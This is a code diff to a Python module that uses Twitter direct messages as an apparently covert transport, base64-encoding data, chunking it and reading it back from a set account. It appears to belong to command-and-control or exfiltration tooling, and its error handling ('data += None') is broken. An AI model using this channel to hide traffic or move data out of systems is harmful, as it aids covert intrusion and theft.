@@ -9,6 +9,7 @@ import base64
 
 # transport imports:
 import tweepy
+from time import sleep
 
 # START GHETTO ASS CONFIG, should be read in when compiled...
 CONSUMER_TOKEN = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
@@ -28,20 +29,40 @@ def decode(data):
 	return base64.b64decode(data)
 # </encoder functions>
 
+
+# <transport functions>
+def prepTransport():
+	global api
+
+	auth = tweepy.OAuthHandler(CONSUMER_TOKEN, CONSUMER_SECRET)
+	auth.set_access_token(ACCESS_TOKEN, ACCESS_TOKEN_SECRET)
+
+	# Construct the api instance
+	api = tweepy.API(auth)
+
 def sendData(data):
-	slen = struct.pack('<I', len(data))
-	message = (slen+data)
-	api.send_direct_message(user=USERNAME, text=message)
+	encoded_data = encode(data)
+	if len(encoded_data) > 10000:
+		dataArray = [encoded_data[i:i + 6000] for i in range(0, len(encoded_data), 6000)]
+		for chunk in dataArray:
+			api.send_direct_message(user=USERNAME, text=chunk)
+			sleep(0.1)
+	else:
+		api.send_direct_message(user=USERNAME, text=encoded_data)
 
 def recvData():
-	for message in api.direct_messages(count=200, full_text="true"):
+	data = ""
+	for message in api.direct_messages(count=1000, full_text="true"):
 		if (message.sender_screen_name == USERNAME):
 			try:
-				data = message.text[4:] # ignore the frame size
+				data += message.text # ignore the frame size
 			except:
-				data = None
+				data += None
 				pass
-	return data
+	decoded_data = decode(data)
+	return decoded_data
+
+# </transport functions>
 
 maxlen = 1024*1024
 
